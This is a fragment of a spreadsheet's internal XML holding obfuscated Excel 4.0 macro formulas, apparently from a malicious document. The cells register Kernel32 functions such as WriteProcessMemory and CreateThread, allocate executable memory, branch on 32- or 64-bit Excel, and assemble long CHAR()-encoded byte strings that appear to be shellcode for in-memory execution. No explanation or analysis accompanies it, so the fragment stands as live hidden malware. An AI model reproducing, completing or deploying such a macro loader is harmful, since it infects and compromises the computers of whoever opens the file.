        <f>CHAR(22)&amp;CHAR(65)&amp;CHAR(118)&amp;CHAR(255)&amp;CHAR(157)&amp;CHAR(15)&amp;CHAR(166)&amp;CHAR(88)&amp;CHAR(175)&amp;CHAR(85)</f>
        <v>_x0016_Avÿ_x000F_¦X¯U</v>
      </c>
      <c r="DH7" t="s">
        <v>6</v>
      </c>
      <c r="DJ7">
        <f>REGISTER("Kernel32","WriteProcessMemory","JJJCJJ","WProcessMemory",,1,9)</f>
        <v>-151322623</v>
      </c>
    </row>
    <row r="8" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE8" t="b">
        <f>FORMULA(DH65&amp;DH44&amp;DH31&amp;DH33&amp;DH35&amp;DH45&amp;DH46&amp;DH31&amp;DH44&amp;DH66&amp;DH68&amp;DH37&amp;DH5&amp;DH18&amp;DH14&amp;DH5&amp;DH12&amp;DH56&amp;DH55&amp;DH68&amp;DH76&amp;DH68&amp;DH29&amp;DH18&amp;DH5&amp;DH1&amp;DH20&amp;DH5&amp;DH46&amp;DH8&amp;DH18&amp;DH5&amp;DH1&amp;DH4&amp;DH68&amp;DH76&amp;DH68&amp;DH36&amp;DH36&amp;DH36&amp;DH36&amp;DH36&amp;DH36&amp;DH36&amp;DH68&amp;DH76&amp;DH68&amp;DH29&amp;DH46&amp;DH8&amp;DH18&amp;DH5&amp;DH1&amp;DH4&amp;DH68&amp;DH76&amp;DH76&amp;DH54&amp;DH76&amp;DH62&amp;DH67,DJ8)</f>
        <v>1</v>
      </c>
      <c r="DF8" t="str">
        <f>CHAR(112)&amp;CHAR(82)&amp;CHAR(48)&amp;CHAR(234)&amp;CHAR(2)&amp;CHAR(88)&amp;CHAR(114)&amp;CHAR(129)&amp;CHAR(3)&amp;CHAR(201)&amp;CHAR(191)&amp;CHAR(22)&amp;CHAR(239)&amp;CHAR(137)&amp;CHAR(202)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(167)&amp;CHAR(219)&amp;CHAR(13)&amp;CHAR(197)&amp;CHAR(36)&amp;CHAR(119)&amp;CHAR(195)&amp;CHAR(147)&amp;CHAR(45)&amp;CHAR(18)&amp;CHAR(1)&amp;CHAR(106)&amp;CHAR(180)&amp;CHAR(202)&amp;CHAR(171)&amp;CHAR(73)&amp;CHAR(241)&amp;CHAR(151)&amp;CHAR(224)&amp;CHAR(207)&amp;CHAR(212)&amp;CHAR(67)&amp;CHAR(240)&amp;CHAR(149)&amp;CHAR(116)&amp;CHAR(53)&amp;CHAR(208)&amp;CHAR(106)&amp;CHAR(72)&amp;CHAR(46)&amp;CHAR(129)&amp;CHAR(41)&amp;CHAR(82)&amp;CHAR(224)&amp;CHAR(47)&amp;CHAR(119)&amp;CHAR(117)&amp;CHAR(78)&amp;CHAR(211)&amp;CHAR(69)&amp;CHAR(186)&amp;CHAR(12)&amp;CHAR(222)&amp;CHAR(37)&amp;CHAR(152)&amp;CHAR(59)&amp;CHAR(222)&amp;CHAR(4)&amp;CHAR(18)&amp;CHAR(223)&amp;CHAR(86)&amp;CHAR(55)&amp;CHAR(201)&amp;CHAR(10)&amp;CHAR(31)&amp;CHAR(194)&amp;CHAR(196)&amp;CHAR(151)&amp;CHAR(203)&amp;CHAR(87)&amp;CHAR(40)&amp;CHAR(212)&amp;CHAR(99)&amp;CHAR(205)&amp;CHAR(12)&amp;CHAR(182)&amp;CHAR(217)&amp;CHAR(195)&amp;CHAR(102)&amp;CHAR(212)&amp;CHAR(78)&amp;CHAR(37)&amp;CHAR(192)&amp;CHAR(179)&amp;CHAR(243)&amp;CHAR(36)&amp;CHAR(112)&amp;CHAR(228)&amp;CHAR(255)&amp;CHAR(135)&amp;CHAR(227)&amp;CHAR(235)&amp;CHAR(28)&amp;CHAR(134)&amp;CHAR(88)&amp;CHAR(139)&amp;CHAR(3)&amp;CHAR(11)&amp;CHAR(34)&amp;CHAR(134)&amp;CHAR(145)&amp;CHAR(84)&amp;CHAR(16)&amp;CHAR(122)&amp;CHAR(181)&amp;CHAR(210)&amp;CHAR(179)&amp;CHAR(64)&amp;CHAR(111)&amp;CHAR(117)&amp;CHAR(19)&amp;CHAR(34)&amp;CHAR(85)&amp;CHAR(74)&amp;CHAR(245)&amp;CHAR(140)&amp;CHAR(125)&amp;CHAR(236)&amp;CHAR(138)&amp;CHAR(247)&amp;CHAR(102)&amp;CHAR(200)&amp;CHAR(147)&amp;CHAR(134)&amp;CHAR(182)&amp;CHAR(95)&amp;CHAR(64)&amp;CHAR(50)&amp;CHAR(241)&amp;CHAR(142)&amp;CHAR(241)&amp;CHAR(147)&amp;CHAR(2)&amp;CHAR(38)&amp;CHAR(235)&amp;CHAR(194)&amp;CHAR(248)&amp;CHAR(3)&amp;CHAR(141)&amp;CHAR(24)&amp;CHAR(228)&amp;CHAR(46)&amp;CHAR(255)&amp;CHAR(22)&amp;CHAR(172)&amp;CHAR(131)&amp;CHAR(181)&amp;CHAR(1)&amp;CHAR(136)&amp;CHAR(246)&amp;CHAR(166)&amp;CHAR(123)&amp;CHAR(226)&amp;CHAR(140)&amp;CHAR(191)&amp;CHAR(226)&amp;CHAR(151)&amp;CHAR(160)&amp;CHAR(43)&amp;CHAR(12)&amp;CHAR(187)&amp;CHAR(79)&amp;CHAR(128)&amp;CHAR(191)&amp;CHAR(57)&amp;CHAR(142)&amp;CHAR(31)&amp;CHAR(214)&amp;CHAR(77)&amp;CHAR(154)&amp;CHAR(168)&amp;CHAR(20)&amp;CHAR(92)&amp;CHAR(106)&amp;CHAR(35)&amp;CHAR(129)&amp;CHAR(169)&amp;CHAR(254)&amp;CHAR(107)&amp;CHAR(168)&amp;CHAR(8)&amp;CHAR(44)&amp;CHAR(164)&amp;CHAR(83)&amp;CHAR(197)&amp;CHAR(252)&amp;CHAR(235)&amp;CHAR(26)&amp;CHAR(174)&amp;CHAR(249)&amp;CHAR(19)&amp;CHAR(20)&amp;CHAR(171)&amp;CHAR(120)&amp;CHAR(207)&amp;CHAR(141)&amp;CHAR(48)&amp;CHAR(13)&amp;CHAR(48)&amp;CHAR(136)&amp;CHAR(177)&amp;CHAR(110)&amp;CHAR(71)&amp;CHAR(77)&amp;CHAR(232)&amp;CHAR(108)&amp;CHAR(165)&amp;CHAR(194)&amp;CHAR(165)&amp;CHAR(114)&amp;CHAR(219)&amp;CHAR(8)&amp;CHAR(223)&amp;CHAR(11)&amp;CHAR(128)&amp;CHAR(21)&amp;CHAR(178)&amp;CHAR(47)&amp;CHAR(67)&amp;CHAR(91)&amp;CHAR(92)&amp;CHAR(23)&amp;CHAR(65)&amp;CHAR(135)&amp;CHAR(134)&amp;CHAR(119)&amp;CHAR(136)&amp;CHAR(199)&amp;CHAR(111)&amp;CHAR(183)&amp;CHAR(229)&amp;CHAR(194)&amp;CHAR(180)&amp;CHAR(126)&amp;CHAR(213)&amp;CHAR(99)&amp;CHAR(40)&amp;CHAR(81)&amp;CHAR(142)&amp;CHAR(192)&amp;CHAR(136)&amp;CHAR(212)&amp;CHAR(3)&amp;CHAR(82)&amp;CHAR(79)&amp;CHAR(75)&amp;CHAR(122)&amp;CHAR(182)</f>
        <v>pR0ê_x0002_Xr_x0003_É¿_x0016_ï‰ÊÖÈ§Û_x000D_Å$wÃ“-_x0012__x0001_j´Ê«Iñ—àÏÔCð•t5ÐjH.)Rà/wuNÓEº_x000C_Þ%˜;Þ_x0004__x0012_ßV7É
_x001F_ÂÄ—ËW(ÔcÍ_x000C_¶ÙÃfÔN%À³ó$päÿ‡ãë_x001C_†X‹_x0003__x000B_"†‘T_x0010_zµÒ³@ou_x0013_"UJõŒ}ìŠ÷fÈ“†¶_@2ñŽñ“_x0002_&amp;ëÂø_x0003__x0018_ä.ÿ_x0016_¬ƒµ_x0001_ˆö¦{âŒ¿â— +_x000C_»O€¿9Ž_x001F_ÖMš¨_x0014_\j#©þk¨_x0008_,¤SÅüë_x001A_®ù_x0013__x0014_«xÏ0_x000D_0ˆ±nGMèl¥Â¥rÛ_x0008_ß_x000B_€_x0015_²/C[\_x0017_A‡†wˆÇo·åÂ´~Õc(QŽÀˆÔ_x0003_ROKz¶</v>
      </c>
      <c r="DG8" t="str">
        <f>CHAR(219)&amp;CHAR(171)&amp;CHAR(241)&amp;CHAR(190)&amp;CHAR(130)&amp;CHAR(245)&amp;CHAR(235)&amp;CHAR(57)&amp;CHAR(18)&amp;CHAR(155)</f>
        <v>Û«ñ¾‚õë9_x0012_›</v>
      </c>
      <c r="DH8" t="s">
        <v>7</v>
      </c>
      <c r="DJ8">
        <f>REGISTER("Kernel32","CreateThread","JJJJJJJ","CThread",,1,9)</f>
        <v>-1680080894</v>
      </c>
    </row>
    <row r="9" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE9" t="b">
        <f>FORMULA(DH65&amp;DH35&amp;DH32&amp;DH66&amp;DH35&amp;DH45&amp;DH40&amp;DH47&amp;DH39&amp;DH28&amp;DH31&amp;DH44&amp;DH66&amp;DH45&amp;DH31&amp;DH27&amp;DH44&amp;DH29&amp;DH34&amp;DH66&amp;DH68&amp;DH56&amp;DH55&amp;DH68&amp;DH76&amp;DH33&amp;DH31&amp;DH46&amp;DH71&amp;DH49&amp;DH41&amp;DH44&amp;DH37&amp;DH45&amp;DH42&amp;DH27&amp;DH29&amp;DH31&amp;DH66&amp;DH54&amp;DH67&amp;DH67&amp;DH67&amp;DH76&amp;DH33&amp;DH41&amp;DH46&amp;DH41&amp;DH66&amp;DH44&amp;DH54&amp;DH53&amp;DH29&amp;DH54&amp;DH54&amp;DH57&amp;DH67&amp;DH76&amp;DH33&amp;DH41&amp;DH46&amp;DH41&amp;DH66&amp;DH44&amp;DH55&amp;DH54&amp;DH29&amp;DH54&amp;DH54&amp;DH57&amp;DH67&amp;DH67,DJ9)</f>
        <v>1</v>
      </c>
      <c r="DF9" t="str">
        <f>CHAR(139)&amp;CHAR(132)&amp;CHAR(47)&amp;CHAR(143)&amp;CHAR(218)&amp;CHAR(131)&amp;CHAR(147)&amp;CHAR(34)&amp;CHAR(169)&amp;CHAR(29)&amp;CHAR(211)&amp;CHAR(118)&amp;CHAR(240)&amp;CHAR(228)&amp;CHAR(45)&amp;CHAR(229)&amp;CHAR(192)&amp;CHAR(227)&amp;CHAR(134)&amp;CHAR(133)&amp;CHAR(248)&amp;CHAR(126)&amp;CHAR(72)&amp;CHAR(189)&amp;CHAR(161)&amp;CHAR(13)&amp;CHAR(82)&amp;CHAR(9)&amp;CHAR(202)&amp;CHAR(198)&amp;CHAR(26)&amp;CHAR(196)&amp;CHAR(218)&amp;CHAR(90)&amp;CHAR(246)&amp;CHAR(102)&amp;CHAR(38)&amp;CHAR(148)&amp;CHAR(55)&amp;CHAR(222)&amp;CHAR(101)&amp;CHAR(217)&amp;CHAR(71)&amp;CHAR(25)&amp;CHAR(142)&amp;CHAR(210)&amp;CHAR(62)&amp;CHAR(180)&amp;CHAR(149)&amp;CHAR(186)&amp;CHAR(30)&amp;CHAR(92)&amp;CHAR(241)&amp;CHAR(196)&amp;CHAR(219)&amp;CHAR(9)&amp;CHAR(64)&amp;CHAR(129)&amp;CHAR(212)&amp;CHAR(97)&amp;CHAR(106)&amp;CHAR(19)&amp;CHAR(96)&amp;CHAR(246)&amp;CHAR(207)&amp;CHAR(24)&amp;CHAR(207)&amp;CHAR(49)&amp;CHAR(40)&amp;CHAR(229)&amp;CHAR(229)&amp;CHAR(49)&amp;CHAR(102)&amp;CHAR(35)&amp;CHAR(204)&amp;CHAR(71)&amp;CHAR(233)&amp;CHAR(88)&amp;CHAR(174)&amp;CHAR(213)&amp;CHAR(119)&amp;CHAR(243)&amp;CHAR(73)&amp;CHAR(50)&amp;CHAR(175)&amp;CHAR(83)&amp;CHAR(25)&amp;CHAR(115)&amp;CHAR(88)&amp;CHAR(169)&amp;CHAR(219)&amp;CHAR(24)&amp;CHAR(134)&amp;CHAR(87)&amp;CHAR(23)&amp;CHAR(108)&amp;CHAR(56)&amp;CHAR(46)&amp;CHAR(202)&amp;CHAR(78)&amp;CHAR(196)&amp;CHAR(180)&amp;CHAR(48)&amp;CHAR(133)&amp;CHAR(63)&amp;CHAR(129)&amp;CHAR(158)&amp;CHAR(188)&amp;CHAR(90)&amp;CHAR(246)&amp;CHAR(229)&amp;CHAR(134)&amp;CHAR(96)&amp;CHAR(177)&amp;CHAR(70)&amp;CHAR(9)&amp;CHAR(163)&amp;CHAR(144)&amp;CHAR(201)&amp;CHAR(26)&amp;CHAR(162)&amp;CHAR(205)&amp;CHAR(28)&amp;CHAR(75)&amp;CHAR(179)&amp;CHAR(218)&amp;CHAR(35)&amp;CHAR(193)&amp;CHAR(147)&amp;CHAR(46)&amp;CHAR(231)&amp;CHAR(233)&amp;CHAR(143)&amp;CHAR(71)&amp;CHAR(171)&amp;CHAR(213)&amp;CHAR(121)&amp;CHAR(60)&amp;CHAR(237)&amp;CHAR(92)&amp;CHAR(139)&amp;CHAR(14)&amp;CHAR(148)&amp;CHAR(112)&amp;CHAR(69)&amp;CHAR(237)&amp;CHAR(51)&amp;CHAR(220)&amp;CHAR(9)&amp;CHAR(229)&amp;CHAR(136)&amp;CHAR(74)&amp;CHAR(85)&amp;CHAR(88)&amp;CHAR(44)&amp;CHAR(68)&amp;CHAR(189)&amp;CHAR(47)&amp;CHAR(197)&amp;CHAR(56)&amp;CHAR(234)&amp;CHAR(13)&amp;CHAR(7)&amp;CHAR(230)&amp;CHAR(246)&amp;CHAR(59)&amp;CHAR(84)&amp;CHAR(192)&amp;CHAR(218)&amp;CHAR(142)&amp;CHAR(160)&amp;CHAR(93)&amp;CHAR(110)&amp;CHAR(124)&amp;CHAR(127)&amp;CHAR(249)&amp;CHAR(115)&amp;CHAR(111)&amp;CHAR(231)&amp;CHAR(180)&amp;CHAR(117)&amp;CHAR(3)&amp;CHAR(187)&amp;CHAR(201)&amp;CHAR(40)&amp;CHAR(186)&amp;CHAR(87)&amp;CHAR(164)&amp;CHAR(16)&amp;CHAR(234)&amp;CHAR(144)&amp;CHAR(2)&amp;CHAR(45)&amp;CHAR(79)&amp;CHAR(4)&amp;CHAR(10)&amp;CHAR(179)&amp;CHAR(45)&amp;CHAR(16)&amp;CHAR(216)&amp;CHAR(39)&amp;CHAR(89)&amp;CHAR(225)&amp;CHAR(249)&amp;CHAR(166)&amp;CHAR(165)&amp;CHAR(252)&amp;CHAR(103)&amp;CHAR(82)&amp;CHAR(189)&amp;CHAR(131)&amp;CHAR(4)&amp;CHAR(41)&amp;CHAR(205)&amp;CHAR(222)&amp;CHAR(83)&amp;CHAR(34)&amp;CHAR(84)&amp;CHAR(17)&amp;CHAR(53)&amp;CHAR(224)&amp;CHAR(15)&amp;CHAR(89)&amp;CHAR(87)&amp;CHAR(240)&amp;CHAR(191)&amp;CHAR(51)&amp;CHAR(216)&amp;CHAR(117)&amp;CHAR(129)&amp;CHAR(80)&amp;CHAR(99)&amp;CHAR(108)&amp;CHAR(220)&amp;CHAR(229)&amp;CHAR(128)&amp;CHAR(140)&amp;CHAR(139)&amp;CHAR(239)&amp;CHAR(114)&amp;CHAR(161)&amp;CHAR(189)&amp;CHAR(81)&amp;CHAR(65)&amp;CHAR(108)&amp;CHAR(144)&amp;CHAR(205)&amp;CHAR(4)&amp;CHAR(254)&amp;CHAR(203)&amp;CHAR(9)&amp;CHAR(78)&amp;CHAR(107)&amp;CHAR(37)&amp;CHAR(80)</f>
        <v>‹„/Úƒ“"©_x001D_Óvðä-åÀã†…ø~H½¡_x000D_R	ÊÆ_x001A_ÄÚZöf&amp;”7ÞeÙG_x0019_ŽÒ&gt;´•º_x001E_\ñÄÛ	@Ôaj_x0013_`öÏ_x0018_Ï1(åå1f#ÌGéX®ÕwóI2¯S_x0019_sX©Û_x0018_†W_x0017_l8.ÊNÄ´0…?ž¼Zöå†`±F	£É_x001A_¢Í_x001C_K³Ú#Á“.çéG«Õy&lt;í\‹_x000E_”pEí3Ü	åˆJUX,D½/Å8ê_x000D__x0007_æö;TÀÚŽ ]n|ùsoç´u_x0003_»É(ºW¤_x0010_ê_x0002_-O_x0004_
³-_x0010_Ø'Yáù¦¥ügR½ƒ_x0004_)ÍÞS"T_x0011_5à_x000F_YWð¿3ØuPclÜå€Œ‹ïr¡½QAlÍ_x0004_þË	Nk%P</v>
      </c>
      <c r="DG9" t="str">
        <f>CHAR(92)&amp;CHAR(226)&amp;CHAR(238)&amp;CHAR(52)&amp;CHAR(211)&amp;CHAR(148)&amp;CHAR(62)&amp;CHAR(243)&amp;CHAR(133)&amp;CHAR(202)</f>
        <v>\âî4Ó”&gt;ó…Ê</v>
      </c>
      <c r="DH9" t="s">
        <v>8</v>
      </c>
      <c r="DJ9" t="b">
        <f>IF(ISNUMBER(SEARCH("32",GET.WORKSPACE(1))),GOTO($DJ$10),GOTO($DJ$21))</f>
        <v>1</v>
      </c>
    </row>
    <row r="10" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE10" t="b">
        <f>FORMULA(DH65&amp;DH48&amp;DH1&amp;DH12&amp;DH12&amp;DH15&amp;DH3&amp;DH66&amp;DH53&amp;DH76&amp;DH59&amp;DH58&amp;DH58&amp;DH56&amp;DH59&amp;DH76&amp;DH57&amp;DH53&amp;DH62&amp;DH59&amp;DH76&amp;DH59&amp;DH57&amp;DH67,DJ10)</f>
        <v>1</v>
      </c>
      <c r="DF10" t="str">
        <f>CHAR(44)&amp;CHAR(85)&amp;CHAR(231)&amp;CHAR(239)&amp;CHAR(232)&amp;CHAR(91)&amp;CHAR(44)&amp;CHAR(255)&amp;CHAR(28)&amp;CHAR(206)&amp;CHAR(164)&amp;CHAR(236)&amp;CHAR(115)&amp;CHAR(233)&amp;CHAR(130)&amp;CHAR(9)&amp;CHAR(182)&amp;CHAR(186)&amp;CHAR(104)&amp;CHAR(204)&amp;CHAR(12)&amp;CHAR(197)&amp;CHAR(21)&amp;CHAR(176)&amp;CHAR(236)&amp;CHAR(167)&amp;CHAR(233)&amp;CHAR(163)&amp;CHAR(184)&amp;CHAR(214)&amp;CHAR(225)&amp;CHAR(171)&amp;CHAR(52)&amp;CHAR(20)&amp;CHAR(240)&amp;CHAR(139)&amp;CHAR(137)&amp;CHAR(202)&amp;CHAR(197)&amp;CHAR(100)&amp;CHAR(194)&amp;CHAR(26)&amp;CHAR(173)&amp;CHAR(149)&amp;CHAR(226)&amp;CHAR(248)&amp;CHAR(219)&amp;CHAR(118)&amp;CHAR(31)&amp;CHAR(154)&amp;CHAR(126)&amp;CHAR(73)&amp;CHAR(213)&amp;CHAR(31)&amp;CHAR(239)&amp;CHAR(77)&amp;CHAR(205)&amp;CHAR(171)&amp;CHAR(70)&amp;CHAR(178)&amp;CHAR(62)&amp;CHAR(231)&amp;CHAR(250)&amp;CHAR(38)&amp;CHAR(211)&amp;CHAR(141)&amp;CHAR(240)&amp;CHAR(111)&amp;CHAR(25)&amp;CHAR(48)&amp;CHAR(63)&amp;CHAR(75)&amp;CHAR(151)&amp;CHAR(157)&amp;CHAR(209)&amp;CHAR(228)&amp;CHAR(84)&amp;CHAR(41)&amp;CHAR(5)&amp;CHAR(229)&amp;CHAR(149)&amp;CHAR(119)&amp;CHAR(135)&amp;CHAR(227)&amp;CHAR(95)&amp;CHAR(180)&amp;CHAR(93)&amp;CHAR(131)&amp;CHAR(105)&amp;CHAR(200)&amp;CHAR(12)&amp;CHAR(195)&amp;CHAR(95)&amp;CHAR(148)&amp;CHAR(128)&amp;CHAR(22)&amp;CHAR(171)&amp;CHAR(198)&amp;CHAR(202)&amp;CHAR(138)&amp;CHAR(78)&amp;CHAR(7)&amp;CHAR(57)&amp;CHAR(145)&amp;CHAR(135)&amp;CHAR(106)&amp;CHAR(30)&amp;CHAR(11)&amp;CHAR(234)&amp;CHAR(233)&amp;CHAR(128)&amp;CHAR(161)&amp;CHAR(227)&amp;CHAR(29)&amp;CHAR(77)&amp;CHAR(135)&amp;CHAR(187)&amp;CHAR(146)&amp;CHAR(3)&amp;CHAR(177)&amp;CHAR(33)&amp;CHAR(169)&amp;CHAR(112)&amp;CHAR(36)&amp;CHAR(123)&amp;CHAR(200)&amp;CHAR(76)&amp;CHAR(84)&amp;CHAR(5)&amp;CHAR(101)&amp;CHAR(228)&amp;CHAR(250)&amp;CHAR(208)&amp;CHAR(195)&amp;CHAR(112)&amp;CHAR(146)&amp;CHAR(189)&amp;CHAR(186)&amp;CHAR(149)&amp;CHAR(191)&amp;CHAR(133)&amp;CHAR(210)&amp;CHAR(33)&amp;CHAR(189)&amp;CHAR(129)&amp;CHAR(109)&amp;CHAR(147)&amp;CHAR(192)&amp;CHAR(150)&amp;CHAR(61)&amp;CHAR(140)&amp;CHAR(248)&amp;CHAR(125)&amp;CHAR(222)&amp;CHAR(237)&amp;CHAR(3)&amp;CHAR(18)&amp;CHAR(153)&amp;CHAR(68)&amp;CHAR(83)&amp;CHAR(180)&amp;CHAR(216)&amp;CHAR(6)&amp;CHAR(29)&amp;CHAR(127)&amp;CHAR(206)&amp;CHAR(245)&amp;CHAR(78)&amp;CHAR(26)&amp;CHAR(214)&amp;CHAR(226)&amp;CHAR(23)&amp;CHAR(23)&amp;CHAR(57)&amp;CHAR(88)&amp;CHAR(104)&amp;CHAR(122)&amp;CHAR(240)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(195)&amp;CHAR(35)&amp;CHAR(192)&amp;CHAR(35)&amp;CHAR(38)&amp;CHAR(186)&amp;CHAR(8)&amp;CHAR(114)&amp;CHAR(254)&amp;CHAR(21)&amp;CHAR(133)&amp;CHAR(101)&amp;CHAR(39)&amp;CHAR(169)&amp;CHAR(94)&amp;CHAR(171)&amp;CHAR(46)&amp;CHAR(189)&amp;CHAR(194)&amp;CHAR(175)&amp;CHAR(238)&amp;CHAR(111)&amp;CHAR(157)&amp;CHAR(63)&amp;CHAR(195)&amp;CHAR(211)&amp;CHAR(88)&amp;CHAR(107)&amp;CHAR(227)&amp;CHAR(58)&amp;CHAR(101)&amp;CHAR(30)&amp;CHAR(89)&amp;CHAR(175)&amp;CHAR(175)&amp;CHAR(38)&amp;CHAR(15)&amp;CHAR(104)&amp;CHAR(42)&amp;CHAR(157)&amp;CHAR(59)&amp;CHAR(45)&amp;CHAR(59)&amp;CHAR(49)&amp;CHAR(232)&amp;CHAR(224)&amp;CHAR(44)&amp;CHAR(243)&amp;CHAR(91)&amp;CHAR(114)&amp;CHAR(232)&amp;CHAR(73)&amp;CHAR(123)&amp;CHAR(7)&amp;CHAR(4)&amp;CHAR(215)&amp;CHAR(31)&amp;CHAR(87)&amp;CHAR(142)&amp;CHAR(51)&amp;CHAR(195)&amp;CHAR(159)&amp;CHAR(126)&amp;CHAR(177)&amp;CHAR(176)&amp;CHAR(150)&amp;CHAR(138)&amp;CHAR(25)&amp;CHAR(29)&amp;CHAR(183)&amp;CHAR(67)&amp;CHAR(194)&amp;CHAR(166)&amp;CHAR(219)&amp;CHAR(85)</f>
        <v>,Uçïè[,ÿ_x001C_Î¤ìsé‚	¶ºhÌ_x000C_Å_x0015_°ì§é£¸Öá«4_x0014_ð‹‰ÊÅdÂ_x001A_­•âøÛv_x001F_š~IÕ_x001F_ïMÍ«F²&gt;çú&amp;Óðo_x0019_0?K—ÑäT)_x0005_å•w‡ã_´]ƒiÈ_x000C_Ã_”€_x0016_«ÆÊŠN_x0007_9‘‡j_x001E__x000B_êé€¡ã_x001D_M‡»’_x0003_±!©p${ÈLT_x0005_eäúÐÃp’½º•¿…Ò!½m“À–=Œø}Þí_x0003__x0012_™DS´Ø_x0006__x001D_ÎõN_x001A_Öâ_x0017__x0017_9XhzðÏ&gt;Ã#À#&amp;º_x0008_rþ_x0015_…e'©^«.½Â¯îo?ÃÓXkã:e_x001E_Y¯¯&amp;_x000F_h*;-;1èà,ó[rèI{_x0007__x0004_×_x001F_WŽ3ÃŸ~±°–Š_x0019__x001D_·CÂ¦ÛU</v>
      </c>
      <c r="DG10" t="str">
        <f>CHAR(67)&amp;CHAR(8)&amp;CHAR(187)&amp;CHAR(69)&amp;CHAR(30)&amp;CHAR(94)&amp;CHAR(169)&amp;CHAR(162)&amp;CHAR(170)&amp;CHAR(25)</f>
        <v>C_x0008_»E_x001E_^©¢ª_x0019_</v>
      </c>
      <c r="DH10" t="s">
        <v>9</v>
      </c>
      <c r="DJ10" t="b">
        <f>Valloc(0,65536,4096,64)</f>
        <v>0</v>
      </c>
    </row>
    <row r="11" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE11" t="b">
        <f>FORMULA(DH13&amp;DH1&amp;DH9&amp;DH14&amp;DH65&amp;DH44&amp;DH54&amp;DH29&amp;DH54&amp;DH54&amp;DH53,DJ11)</f>
        <v>1</v>
      </c>
      <c r="DF11" t="str">
        <f>CHAR(236)&amp;CHAR(159)&amp;CHAR(133)&amp;CHAR(147)&amp;CHAR(210)&amp;CHAR(12)&amp;CHAR(213)&amp;CHAR(100)&amp;CHAR(193)&amp;CHAR(77)&amp;CHAR(166)&amp;CHAR(133)&amp;CHAR(61)&amp;CHAR(12)&amp;CHAR(126)&amp;CHAR(64)&amp;CHAR(168)&amp;CHAR(72)&amp;CHAR(99)&amp;CHAR(119)&amp;CHAR(142)&amp;CHAR(155)&amp;CHAR(211)&amp;CHAR(80)&amp;CHAR(207)&amp;CHAR(176)&amp;CHAR(103)&amp;CHAR(210)&amp;CHAR(153)&amp;CHAR(223)&amp;CHAR(35)&amp;CHAR(180)&amp;CHAR(108)&amp;CHAR(52)&amp;CHAR(245)&amp;CHAR(231)&amp;CHAR(166)&amp;CHAR(197)&amp;CHAR(39)&amp;CHAR(153)&amp;CHAR(155)&amp;CHAR(143)&amp;CHAR(163)&amp;CHAR(48)&amp;CHAR(118)&amp;CHAR(195)&amp;CHAR(100)&amp;CHAR(146)&amp;CHAR(115)&amp;CHAR(254)&amp;CHAR(182)&amp;CHAR(126)&amp;CHAR(125)&amp;CHAR(185)&amp;CHAR(72)&amp;CHAR(201)&amp;CHAR(177)&amp;CHAR(129)&amp;CHAR(215)&amp;CHAR(101)&amp;CHAR(121)&amp;CHAR(213)&amp;CHAR(70)&amp;CHAR(178)&amp;CHAR(136)&amp;CHAR(221)&amp;CHAR(200)&amp;CHAR(251)&amp;CHAR(201)&amp;CHAR(117)&amp;CHAR(48)&amp;CHAR(243)&amp;CHAR(226)&amp;CHAR(38)&amp;CHAR(75)&amp;CHAR(24)&amp;CHAR(39)&amp;CHAR(169)&amp;CHAR(228)&amp;CHAR(183)&amp;CHAR(113)&amp;CHAR(168)&amp;CHAR(77)&amp;CHAR(171)&amp;CHAR(96)&amp;CHAR(162)&amp;CHAR(10)&amp;CHAR(163)&amp;CHAR(109)&amp;CHAR(207)&amp;CHAR(136)&amp;CHAR(137)&amp;CHAR(121)&amp;CHAR(67)&amp;CHAR(154)&amp;CHAR(57)&amp;CHAR(105)&amp;CHAR(175)&amp;CHAR(1)&amp;CHAR(84)&amp;CHAR(64)&amp;CHAR(122)&amp;CHAR(67)&amp;CHAR(122)&amp;CHAR(46)&amp;CHAR(50)&amp;CHAR(68)&amp;CHAR(245)&amp;CHAR(252)&amp;CHAR(28)&amp;CHAR(152)&amp;CHAR(25)&amp;CHAR(19)&amp;CHAR(202)&amp;CHAR(184)&amp;CHAR(13)&amp;CHAR(255)&amp;CHAR(13)&amp;CHAR(178)&amp;CHAR(250)&amp;CHAR(116)&amp;CHAR(105)&amp;CHAR(118)&amp;CHAR(132)&amp;CHAR(127)&amp;CHAR(203)&amp;CHAR(106)&amp;CHAR(3)&amp;CHAR(81)&amp;CHAR(227)&amp;CHAR(232)&amp;CHAR(116)&amp;CHAR(19)&amp;CHAR(40)&amp;CHAR(198)&amp;CHAR(180)&amp;CHAR(232)&amp;CHAR(85)&amp;CHAR(88)&amp;CHAR(245)&amp;CHAR(236)&amp;CHAR(246)&amp;CHAR(116)&amp;CHAR(32)&amp;CHAR(28)&amp;CHAR(22)&amp;CHAR(106)&amp;CHAR(191)&amp;CHAR(243)&amp;CHAR(242)&amp;CHAR(79)&amp;CHAR(203)&amp;CHAR(59)&amp;CHAR(199)&amp;CHAR(142)&amp;CHAR(219)&amp;CHAR(160)&amp;CHAR(47)&amp;CHAR(14)&amp;CHAR(27)&amp;CHAR(229)&amp;CHAR(150)&amp;CHAR(236)&amp;CHAR(238)&amp;CHAR(28)&amp;CHAR(136)&amp;CHAR(196)&amp;CHAR(83)&amp;CHAR(195)&amp;CHAR(72)&amp;CHAR(49)&amp;CHAR(181)&amp;CHAR(121)&amp;CHAR(48)&amp;CHAR(71)&amp;CHAR(2)&amp;CHAR(29)&amp;CHAR(8)&amp;CHAR(104)&amp;CHAR(103)&amp;CHAR(183)&amp;CHAR(78)&amp;CHAR(161)&amp;CHAR(221)&amp;CHAR(70)&amp;CHAR(42)&amp;CHAR(213)&amp;CHAR(56)&amp;CHAR(109)&amp;CHAR(168)&amp;CHAR(158)&amp;CHAR(21)&amp;CHAR(83)&amp;CHAR(67)&amp;CHAR(201)&amp;CHAR(23)&amp;CHAR(125)&amp;CHAR(218)&amp;CHAR(137)&amp;CHAR(129)&amp;CHAR(99)&amp;CHAR(125)&amp;CHAR(49)&amp;CHAR(125)&amp;CHAR(201)&amp;CHAR(210)&amp;CHAR(109)&amp;CHAR(136)&amp;CHAR(102)&amp;CHAR(121)&amp;CHAR(3)&amp;CHAR(230)&amp;CHAR(194)&amp;CHAR(38)&amp;CHAR(46)&amp;CHAR(196)&amp;CHAR(210)&amp;CHAR(46)&amp;CHAR(181)&amp;CHAR(98)&amp;CHAR(111)&amp;CHAR(16)&amp;CHAR(17)&amp;CHAR(123)&amp;CHAR(208)&amp;CHAR(229)&amp;CHAR(180)&amp;CHAR(61)&amp;CHAR(92)&amp;CHAR(205)&amp;